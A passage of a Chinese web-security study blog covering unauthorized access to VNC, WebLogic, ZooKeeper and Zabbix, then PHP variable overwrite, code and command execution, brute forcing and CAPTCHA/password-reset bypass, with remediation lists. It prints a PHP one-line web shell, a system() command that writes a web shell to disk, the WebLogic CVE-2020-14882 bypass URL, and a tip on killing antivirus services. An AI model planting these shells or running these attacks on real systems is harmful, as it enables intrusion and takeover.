class="built_in">set</span> srvport 8080</span><br><span class="line">msf5&gt;exploit </span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞修复-23"><a href="#3-漏洞修复-23" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>对外关闭敏感端口；</li>
<li>配置用户权限认证；</li>
</ul>
<blockquote>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/KevinGeorge/p/10399844.html">https://www.cnblogs.com/KevinGeorge/p/10399844.html</a></p>
</blockquote>
<h2 id="0x26-VNC-未授权访问"><a href="#0x26-VNC-未授权访问" class="headerlink" title="0x26 VNC 未授权访问"></a>0x26 VNC 未授权访问</h2><h3 id="1-漏洞简介-24"><a href="#1-漏洞简介-24" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。</p>
<p>VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。</p>
<h3 id="2-漏洞检测-24"><a href="#2-漏洞检测-24" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用 metasploit 进行批量检测，使用检测模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/vnc/vnx_none_auth</span><br></pre></td></tr></table></figure>

<p>在kali上直接使用vncviewer命令连接主机。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncviewer ip</span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞修复-24"><a href="#3-漏洞修复-24" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码；</li>
<li>以最小权限的普通用户身份运行操作系统；</li>
</ul>
<h2 id="0x27-Weblogic-未授权访问"><a href="#0x27-Weblogic-未授权访问" class="headerlink" title="0x27 Weblogic 未授权访问"></a>0x27 Weblogic 未授权访问</h2><h3 id="1-漏洞简介-25"><a href="#1-漏洞简介-25" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>
<h3 id="2-漏洞检测-25"><a href="#2-漏洞检测-25" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-2020-14882</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131211795.png" alt="img"></p>
<p>攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131212803.png" alt="img"></p>
<p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p>
<h3 id="3-漏洞修复-25"><a href="#3-漏洞修复-25" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>下载补丁程序并安装更新；</li>
</ul>
<h2 id="0x28-ZooKeeper-未授权访问"><a href="#0x28-ZooKeeper-未授权访问" class="headerlink" title="0x28 ZooKeeper 未授权访问"></a>0x28 ZooKeeper 未授权访问</h2><h3 id="1-漏洞简介-26"><a href="#1-漏洞简介-26" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p>
<h3 id="2-漏洞检测-26"><a href="#2-漏洞检测-26" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>stat：列出关于性能和连接的客户端的统计信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure>

<p>ruok：测试服务器是否运行在非错误状态。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ruok |ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure>

<p>dump：列出未完成的会话和临时节点。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> dump |ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞修复-26"><a href="#3-漏洞修复-26" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>为ZooKeeper配置相应的访问权限；</li>
<li>设置防火墙策略；</li>
<li>禁止把Zookeeper直接暴露在公网；</li>
</ul>
<h2 id="0x29-Zabbix-未授权访问"><a href="#0x29-Zabbix-未授权访问" class="headerlink" title="0x29 Zabbix 未授权访问"></a>0x29 Zabbix 未授权访问</h2><h3 id="1-漏洞简介-27"><a href="#1-漏洞简介-27" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p>
<h3 id="2-漏洞检测-27"><a href="#2-漏洞检测-27" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>无需账户密码直接访问zabbix页面</p>
<p><img src="/Image-Chinese%5C20241017131212853.png" alt="img"></p>
<h3 id="3-漏洞修复-27"><a href="#3-漏洞修复-27" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>设置zabbix的复杂口令，不要用默认口令或弱口令，禁用guest登录功能；</li>
<li>zabbix的server和agent都不要以root启动，不要设置AllowRoot&#x3D;1；</li>
<li>禁止agent执行system.run，不要设置EnableRemoteCommands&#x3D;1；</li>
</ul>
<blockquote>
<p>转载：<a target="_blank" rel="noopener" href="http://www.luckyzmj.cn/posts/15dff4d3.html">http://www.luckyzmj.cn/posts/15dff4d3.html</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/17/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/17/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">变量覆盖漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-17 09:40:36" itemprop="dateCreated datePublished" datetime="2022-12-17T09:40:36+08:00">2022-12-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><hr>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>定义：将程序中原有的变量值进行替换，从而达到攻击目的</p>
<p>用自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击</p>
<h2 id="变量覆盖函数"><a href="#变量覆盖函数" class="headerlink" title="变量覆盖函数"></a>变量覆盖函数</h2><blockquote>
<p>$$</p>
</blockquote>
<p>$$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名</p>
<blockquote>
<p>extract()函数</p>
</blockquote>
<p>extract() 从数组中将变量导入到当前的符号表 ，将数组中的键作为变量名，值作为变量的值</p>
<blockquote>
<p>parse_str()函数</p>
</blockquote>
<p>parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
<p>注意：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量</p>
<blockquote>
<p>import_request_variables()函数</p>
</blockquote>
<p>import_request_variables：将 GET／POST／Cookie 变量导入到全局作用域中</p>
<p>import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量,用在register_globals被禁止的时候</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ul>
<li>大多数情况下由函数使用不当导致的</li>
<li>$$使用不当</li>
<li>extract()函数使用不当</li>
<li>parse_str()函数使用不当</li>
<li>import_request_variables()使用不当</li>
<li>开启了全局变量注册等</li>
</ul>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>变量覆盖的漏洞危害主要还是要看代码具体的流程</p>
<p>如果可覆盖掉的变量在后面会进行代码执行，那么他的危害就是代码执行</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/16/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/16/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">代码执行漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-16 16:29:56" itemprop="dateCreated datePublished" datetime="2022-12-16T16:29:56+08:00">2022-12-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><hr>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户输入的数据被当做后端代码进行执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p>一句话木马的本质就是一个代码执行漏洞</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE(remote command&#x2F;code execute)远程命令或者代码执行。现在因为RCE这个词的滥用，RCE的范围比较广，只要渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以属于RCE。</p>
<h2 id="在PHP中常用的代码执行函数"><a href="#在PHP中常用的代码执行函数" class="headerlink" title="在PHP中常用的代码执行函数"></a>在PHP中常用的代码执行函数</h2><ul>
<li>eval()：可将普通字符当作代码进行执行，可以执行多行</li>
<li>assert()：可将普通字符串当作代码进行执行，单行执行</li>
<li>preg_replace()：正则替换函数，</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;bc&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p><img src="https://xbxaq.com/media/202210/2022-10-19_135759_7877170.2744957509361642.png" alt="null"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意点：</span><br><span class="line">这里会固定报错，告诉你不建议你使用/e修饰符。</span><br><span class="line">替换必须真实发生才会触发函数，不发生替换，不会触发。</span><br></pre></td></tr></table></figure>

<ul>
<li>create_function() ：匿名函数</li>
<li>array_map()：回调函数，调用某个函数</li>
<li>特殊组合：”{phpinfo()}”; &#x3D;&#x3D;&#x3D;&gt;代码执行 phpinfo(),PHP的字符串是可以使用复杂的表达式。<br>例如 ${中间可以写调用的函数</li>
</ul>
<p>注意：特殊组合在PHP版本5.5及其以上版本可以使用</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">命令执行漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-15 20:11:56" itemprop="dateCreated datePublished" datetime="2022-12-15T20:11:56+08:00">2022-12-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><hr>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>命令执行：用户输入的数据被当做系统命令执行</p>
<p><img src="https://xbxaq.com/media/202210/2022-10-19_114648_4495750.28568979153771235.png" alt="null"></p>
<p><img src="https://xbxaq.com/media/202210/2022-10-19_114815_2197170.4945763597497762.png" alt="null"></p>
<p>菜刀的终端操作也是利用了命令执行的函数<br>命令执行也可以写文件的方法获得Webshell<br><code>system(&#39;echo &quot;\&lt;?php eval($_REQUEST[1]);?\&gt;&quot; &gt; 666.php&#39;);</code></p>
<p><img src="https://xbxaq.com/media/202210/2022-10-19_114834_2665740.22737047952219325.png" alt="null"></p>
<h2 id="在PHP中常用的系统命令执行函数"><a href="#在PHP中常用的系统命令执行函数" class="headerlink" title="在PHP中常用的系统命令执行函数"></a>在PHP中常用的系统命令执行函数</h2><ul>
<li>system()：php中system函数用于执行外部程序，并且显示输出执行结果</li>
<li>exec()：PHP会去操纵计算机执行whoami的命令,且获取最后一行数据，需要人为打印输出</li>
<li>shell_exec()：PHP会去操纵计算机执行whoami的命令,且获取所有数据，需要人为打印输出</li>
<li>passthru()：只调用命令，把命令的运行结果原样地直接输出到标准输出设备</li>
<li>特殊符号 <code> </code> ：中间的字符会当作命令进行执行，需要人为打印，例如：echo <code>whoami</code>;</li>
</ul>
<h2 id="CMD中常用操作"><a href="#CMD中常用操作" class="headerlink" title="CMD中常用操作"></a>CMD中常用操作</h2><ul>
<li><p>多行执行 &amp;</p>
</li>
<li><p>netstat -ano 查看端口</p>
</li>
<li><p>tasklist 查看进程</p>
</li>
<li><p>kill 杀死进程</p>
</li>
<li><p>arp -a 显示arp高速缓存列表</p>
</li>
<li><p>shutdown 关机（关闭杀软服务，然后重启主机）【找到杀毒软件服务是什么，干掉，再重启主机】</p>
</li>
<li><p>systeminfo 查看系统状态</p>
</li>
<li><p>net user 查看用户</p>
</li>
<li><p>echo 写文件</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>())<span class="meta">?&gt;</span></span><span class="language-xml">;&quot;   &gt;&gt;   1.php</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">暴力破解</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-13 11:02:12" itemprop="dateCreated datePublished" datetime="2022-12-13T11:02:12+08:00">2022-12-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><hr>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>暴力破解是用户使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据</p>
<p>暴力破解的基础：</p>
<ul>
<li>应用程序或服务器未进行交互次数限制</li>
<li>具有覆盖内容全面的字典文件</li>
</ul>
<h2 id="暴力破解的方式"><a href="#暴力破解的方式" class="headerlink" title="暴力破解的方式"></a>暴力破解的方式</h2><p>根据破解的验证内容是否处于服务状态将分为两类:</p>
<p>在线破解</p>
<p>离线破解</p>
<p>无论在线还是离线 是否可以破解成功都取决于字典文件内容的强大</p>
<p>破解速度的瓶颈在于本地机器与服务器性能、带宽等因素</p>
<h1 id="暴力破解测试流程"><a href="#暴力破解测试流程" class="headerlink" title="暴力破解测试流程"></a>暴力破解测试流程</h1><h2 id="1、确认登录接口的脆弱性"><a href="#1、确认登录接口的脆弱性" class="headerlink" title="1、确认登录接口的脆弱性"></a>1、确认登录接口的脆弱性</h2><p>确认目标是否存在暴力破解的漏洞（确认被暴力破解的“可能性”）</p>
<p>比如：尝试登录–抓包–观察验证元素和response信息，判断是否存在被暴力破解的可能</p>
<h2 id="2、对字典进行优化"><a href="#2、对字典进行优化" class="headerlink" title="2、对字典进行优化"></a>2、对字典进行优化</h2><p>根据实际的情况对字典进行优化，提高破解过程的效率</p>
<p>技巧一：根据注册时的提示信息进行优化</p>
<p>技巧二：如果爆破的是管理后台，admin&#x2F;administrator&#x2F;root的可能性更大</p>
<h2 id="3、工具自动化操作"><a href="#3、工具自动化操作" class="headerlink" title="3、工具自动化操作"></a>3、工具自动化操作</h2><p>配置自动化工具（比如线程、超时时间、重试次数等），进行自动化操作</p>
<h1 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h1><p>1、设计安全的验证码（安全的流程+复杂而可用的图形）</p>
<p>2、对认证错误的提交进行计数并给出限制，比如：连续5次密码错误，锁定账户1小时</p>
<p>3、必要的情况下，使用双因素认证</p>
<h1 id="token防暴力破解"><a href="#token防暴力破解" class="headerlink" title="token防暴力破解"></a>token防暴力破解</h1><p>token防不了暴力破解，因为token值是放在前端的，使用攻击者只需要在每次进行重放攻击之前，获取token值，然后放在表单中</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87&%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87&%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">验证码绕过&密码找回漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-09 11:37:39" itemprop="dateCreated datePublished" datetime="2022-12-09T11:37:39+08:00">2022-12-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="验证码绕过-amp-密码找回漏洞"><a href="#验证码绕过-amp-密码找回漏洞" class="headerlink" title="验证码绕过&amp;密码找回漏洞"></a>验证码绕过&amp;密码找回漏洞</h1><hr>
<h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序</p>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>防止恶意破解密码</p>
<p>防止暴力破解</p>
<p>刷票</p>
<p>论坛灌水</p>
<h2 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h2><p>设置了验证码并不是完全可靠，在很多情况存在验证码绕过的情况</p>
<p>前端验证 验证码，但是并没有后端验证</p>
<p>验证码设置了但是并没有进行校验，导致乱输验证码也能够登录</p>
<p>验证码可以重复使用</p>
<p>验证码空值绕过</p>
<p>验证码干扰过低，轻松使用脚本识别</p>
<p>验证码会在HTML页面输出</p>
<p>验证码可控制</p>
<p>验证码有规律，比如时间戳的后6位</p>
<p>万能验证码 （000000 直接绕过）</p>
<p>验证码有时藏在cookie中</p>
<p>图片验证码，类型太少，容易识别</p>
<blockquote>
<p>多次登录后才出现验证码绕过</p>
</blockquote>
<p>基于session</p>
<p>基于IP</p>
<p>基于用户：爆破用户名，而非爆破密码</p>
<h1 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>当用户忘记密码时，需要找回密码，有两种方式:</p>
<p>第一种：找回密码，往邮箱发送明文或密文的密码或验证码（手机短信验证就是往注册时所填写的手机号发送验证码），通过这样的方法判断是否是本人在操作</p>
<p>第二种：发送重置密码的链接到邮箱</p>
<p>第三种： 在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功才能进入密码修改页面</p>
<ul>
<li>§密保问题可能容易直接被猜测 （比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</li>
<li>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面）</li>
</ul>
<p><strong>核心：验证码代表了用户的身份</strong></p>
<h2 id="密码找回绕过"><a href="#密码找回绕过" class="headerlink" title="密码找回绕过"></a>密码找回绕过</h2><p>验证码发送给前端返回</p>
<p>验证码无次数限制可爆破</p>
<p>验证码可控</p>
<p>直接可跳转到修改密码页面</p>
<p>越权漏洞–&gt;自己验证码通过改包然后修改他们的密码</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/06/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/06/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">支付漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
